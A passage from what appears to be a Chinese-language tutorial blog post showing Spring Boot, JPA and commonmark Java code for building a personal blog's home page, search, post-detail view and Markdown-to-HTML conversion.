com.cxkj.blog.service.BlogService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TagService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TypeService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.web.PageableDefault;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogService blogService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TypeService typeService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TagService tagService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;updateTime&quot;&#125;,direction = Sort.Direction.DESC)</span>Pageable pageable, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,blogService.listBlog(pageable));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;types&quot;</span>,typeService.listTypeTop(<span class="number">6</span>));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;tags&quot;</span>,tagService.listTagTop(<span class="number">10</span>));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;recommendBlogs&quot;</span>,blogService.listRecommendBlogTop(<span class="number">8</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/search&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">search</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;updateTime&quot;&#125;,direction = Sort.Direction.DESC)</span>Pageable pageable, <span class="meta">@RequestParam</span> String query, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,blogService.listBlog(<span class="string">&quot;%&quot;</span>+query+<span class="string">&quot;%&quot;</span>,pageable));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;query&quot;</span>,query);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;search&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blog/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">blog</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="comment">/*String blog = null;</span></span><br><span class="line"><span class="comment">            if (blog == null)&#123;</span></span><br><span class="line"><span class="comment">                throw  new NotFoundException(&quot;博客不存在&quot;);</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;blog&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogService.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">getBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(String query,Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">updateBlog</span><span class="params">(Long id,Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.BlogRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MyBeanUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.PageRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.domain.Specification;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaQuery;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Predicate;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Root;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogServiceImpl</span> <span class="keyword">implements</span> <span class="title">BlogService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogRepository blogRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                List&lt;Predicate&gt; predicateList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(<span class="string">&quot;title&quot;</span>),<span class="string">&quot;%&quot;</span>+blogQuery.getTitle()+<span class="string">&quot;%&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.getTypeID() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(<span class="string">&quot;type&quot;</span>).get(<span class="string">&quot;id&quot;</span>),blogQuery.getTypeID()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.isRecommend())&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(<span class="string">&quot;recommend&quot;</span>),blogQuery.isRecommend()));</span><br><span class="line">                &#125;</span><br><span class="line">                criteriaQuery.where(predicateList.toArray(<span class="keyword">new</span> Predicate[predicateList.size()]));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(String query, Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findByQuery(query,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.DESC,<span class="string">&quot;updateTime&quot;</span>);</span><br><span class="line">        Pageable pageable = PageRequest.of(<span class="number">0</span>,size,sort);</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findTop(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blog.getId() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blog.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setViews(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">updateBlog</span><span class="params">(Long id, Blog blog)</span> </span>&#123;</span><br><span class="line">        Blog b = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));</span><br><span class="line">        b.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        blogRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogRepository.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaSpecificationExecutor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Query;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Blog</span>,<span class="title">Long</span>&gt;, <span class="title">JpaSpecificationExecutor</span>&lt;<span class="title">Blog</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(&quot;select b from Blog b where b.recommend = true&quot;)</span></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">findTop</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//select * from t_blog where title like &#x27;%内容%&#x27;</span></span><br><span class="line">    <span class="meta">@Query(&quot;select b from Blog b where b.title like ?1 or b.content like ?1&quot;)</span></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">findByQuery</span><span class="params">(String query,Pageable pageable)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="博客详情业务处理"><a href="#博客详情业务处理" class="headerlink" title="博客详情业务处理"></a>博客详情业务处理</h3><p>IndexController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.BlogService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TagService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TypeService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.web.PageableDefault;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogService blogService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TypeService typeService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TagService tagService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;updateTime&quot;&#125;,direction = Sort.Direction.DESC)</span>Pageable pageable, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,blogService.listBlog(pageable));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;types&quot;</span>,typeService.listTypeTop(<span class="number">6</span>));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;tags&quot;</span>,tagService.listTagTop(<span class="number">10</span>));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;recommendBlogs&quot;</span>,blogService.listRecommendBlogTop(<span class="number">8</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/search&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">search</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;updateTime&quot;&#125;,direction = Sort.Direction.DESC)</span>Pageable pageable, <span class="meta">@RequestParam</span> String query, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,blogService.listBlog(<span class="string">&quot;%&quot;</span>+query+<span class="string">&quot;%&quot;</span>,pageable));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;query&quot;</span>,query);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;search&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blog/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">blog</span><span class="params">(<span class="meta">@PathVariable</span> Long id, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;blog&quot;</span>,blogService.getAndConvert(id));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;blog&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MarkdownUtils.java Markdown转换HTML工具类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.commonmark.Extension;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.ext.gfm.tables.TableBlock;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.ext.gfm.tables.TablesExtension;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.ext.heading.anchor.HeadingAnchorExtension;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.node.Link;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.node.Node;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.parser.Parser;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.renderer.html.AttributeProvider;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.renderer.html.AttributeProviderContext;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.renderer.html.AttributeProviderFactory;</span><br><span class="line"><span class="keyword">import</span> org.commonmark.renderer.html.HtmlRenderer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/12.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MarkdownUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * markdown格式转换成HTML格式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> markdown</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">markdownToHtml</span><span class="params">(String markdown)</span> </span>&#123;</span><br><span class="line">        Parser parser = Parser.builder().build();</span><br><span class="line">        Node document = parser.parse(markdown);</span><br><span class="line">        HtmlRenderer renderer = HtmlRenderer.builder().build();</span><br><span class="line">        <span class="keyword">return</span> renderer.render(document);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 增加扩展[标题锚点，表格生成]</span></span><br><span class="line"><span class="comment">     * Markdown转换成HTML</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> markdown</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">markdownToHtmlExtensions</span><span class="params">(String markdown)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//h标题生成id</span></span><br><span class="line">        Set&lt;Extension&gt; headingAnchorExtensions = Collections.singleton(HeadingAnchorExtension.create());</span><br><span class="line">        <span class="comment">//转换table的HTML</span></span><br><span class="line">        List&lt;Extension&gt; tableExtension = Arrays.asList(TablesExtension.create());</span><br><span class="line">        Parser parser = Parser.builder()</span><br><span class="line">                .extensions(tableExtension)</span><br><span class="line">                .build();</span><br><span class="line">        Node document = parser.parse(markdown);</span><br><span class="line">        HtmlRenderer renderer = HtmlRenderer.builder()</span><br><span class="line">                .extensions(headingAnchorExtensions)</span><br><span class="line">                .extensions(tableExtension)</span><br><span class="line">                .attributeProviderFactory(<span class="keyword">new</span> AttributeProviderFactory() &#123;</span><br><span class="line">                    <span class="function"><span class="keyword">public</span> AttributeProvider <span class="title">create</span><span class="params">(AttributeProviderContext context)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> CustomAttributeProvider();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="keyword">return</span> renderer.render(document);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理标签的属性</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomAttributeProvider</span> <span class="keyword">implements</span> <span class="title">AttributeProvider</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAttributes</span><span class="params">(Node node, String tagName, Map&lt;String, String&gt; attributes)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//改变a标签的target属性为_blank</span></span><br><span class="line">            <span class="keyword">if</span> (node <span class="keyword">instanceof</span> Link) &#123;</span><br><span class="line">                attributes.put(<span class="string">&quot;target&quot;</span>, <span class="string">&quot;_blank&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node <span class="keyword">instanceof</span> TableBlock) &#123;</span><br><span class="line">                attributes.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;ui celled table&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String table = <span class="string">&quot;| hello | hi   | 哈哈哈   |\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;| ----- | ---- | ----- |\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;| 斯维尔多  | 士大夫  | f啊    |\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;| 阿什顿发  | 非固定杆 | 撒阿什顿发 |\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        String a = <span class="string">&quot;[imCoding 爱编程](http://www.lirenmi.cn)&quot;</span>;</span><br><span class="line">        System.out.println(markdownToHtmlExtensions(a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogService.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">getBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(String query,Pageable pageable)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function">Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">updateBlog</span><span class="params">(Long id,Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.BlogRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MarkdownUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MyBeanUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.PageRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> 